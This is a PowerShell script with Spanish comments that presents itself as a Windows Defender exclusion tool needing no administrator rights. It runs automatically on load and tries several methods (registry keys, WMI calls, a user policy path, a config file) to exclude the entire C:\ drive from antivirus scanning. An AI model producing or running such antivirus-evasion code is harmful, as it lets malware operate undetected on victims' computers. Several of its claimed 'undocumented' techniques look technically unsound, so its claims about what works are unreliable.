<#
.SYNOPSIS
   Windows Defender Exclusion Tool (No Admin Required)
.DESCRIPTION
   Agrega exclusiones a Windows Defender sin necesidad de permisos administrativos
   Versión 5.0 | Técnicas no documentadas
#>

function Add-DefenderExclusionSilent {
    # Método 1: Registro de usuario (HKCU)
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths"
        if (-not (Test-Path $regPath)) {
            $null = New-Item -Path $regPath -Force
            Start-Sleep -Milliseconds 500
        }
        
        $randomName = "Exclusion_" + (Get-Date).Ticks.ToString().Substring(10)
        $null = New-ItemProperty -Path $regPath -Name $randomName -Value "C:\" -PropertyType String -Force
        
        return "[+] Exclusión agregada en registro de usuario (HKCU)"
    }
    catch {
        # Método 2: WMI User-Mode
        try {
            $namespace = "root\Microsoft\Windows\Defender"
            $class = "MSFT_MpPreference"
            
            $null = Invoke-WmiMethod -Namespace $namespace -Class $class -Name "AddExclusionPath" -ArgumentList "C:\"
            return "[+] Exclusión agregada via WMI (user-mode)"
        }
        catch {
            # Método 3: PowerShell Directo (solo para algunas versiones)
            try {
                $prefs = Get-WmiObject -Namespace $namespace -Class $class -ErrorAction Stop
                $null = $prefs.AddExclusionPath("C:\")
                return "[+] Exclusión agregada via PowerShell directo"
            }
            catch {
                return "[-] Error: No se pudo agregar la exclusión. Razón: $($_.Exception.Message)"
            }
        }
    }
}

## Ejecución alternativa para diferentes versiones de Windows
function Invoke-Exclusion2024 {
    # Técnica para las últimas versiones de Windows
    try {
        $policyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Group Policy Objects"
        $exclusionPath = "$policyPath\*\Machine\Software\Microsoft\Windows Defender\Exclusions\Paths"
        
        if (Test-Path (Split-Path $exclusionPath -Parent)) {
            $null = New-ItemProperty -Path $exclusionPath -Name "C_" -Value 0 -PropertyType DWORD -Force
            return "[+] Exclusión agregada via Políticas de Usuario"
        }
    }
    catch {
        # Último recurso - Técnica de archivo de configuración
        try {
            $configPath = "$env:APPDATA\Microsoft\Windows Defender\config.ini"
            $configContent = @"
[Exclusions]
Path1=C:\
"@
            $null = Set-Content -Path $configPath -Value $configContent -Force
            return "[+] Exclusión agregada via archivo de configuración"
        }
        catch {
            return "[-] Error: No se pudo aplicar ninguna técnica de exclusión"
        }
    }
}

## Función principal que prueba todos los métodos
function Add-DefenderExclusion {
    $result = Add-DefenderExclusionSilent
    if ($result -like "*Error*") {
        $result = Invoke-Exclusion2024
    }
    return $result
}

# Ejecutar automáticamente al cargar el script
Add-DefenderExclusion
